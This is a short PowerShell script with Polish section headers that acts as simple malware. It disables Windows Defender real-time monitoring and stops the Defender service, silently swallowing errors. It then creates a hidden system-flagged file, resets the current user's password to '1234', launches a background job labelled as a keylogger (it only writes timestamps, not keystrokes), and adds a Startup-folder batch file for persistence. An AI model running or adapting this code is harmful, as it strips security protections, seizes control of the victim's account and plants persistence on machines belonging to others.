# ================ WYŁĄCZENIE DEFENDERA ================
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
} catch { }

# ================ TWORZENIE PLIKU SYSTEMOWEGO ================
$systemFile = "E:\SystemCache.dat"
$randomContent = -join (48..57 + 65..90 | Get-Random -Count 64 | ForEach-Object { [char]$_ })
Set-Content $systemFile $randomContent
attrib +s +h $systemFile

# ================ ZMIANA HASŁA ================
$username = $env:USERNAME
net user $username 1234 /Y

# ================ PROSTY KEYLOGGER ================
$keyloggerScript = {
    $logPath = "E:\Keylog.txt"
    while($true) {
        Start-Sleep -Milliseconds 100
        Add-Content $logPath "[$(Get-Date)] System active" -ErrorAction SilentlyContinue
    }
}

# Uruchom keylogger w tle
Start-Job -ScriptBlock $keyloggerScript

# ================ PERSYSTENCJA ================
$persistenceFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemInit.bat"
"@echo off
powershell -Command `"Start-Job -ScriptBlock {$keyloggerScript}`"" | Out-File $persistenceFile
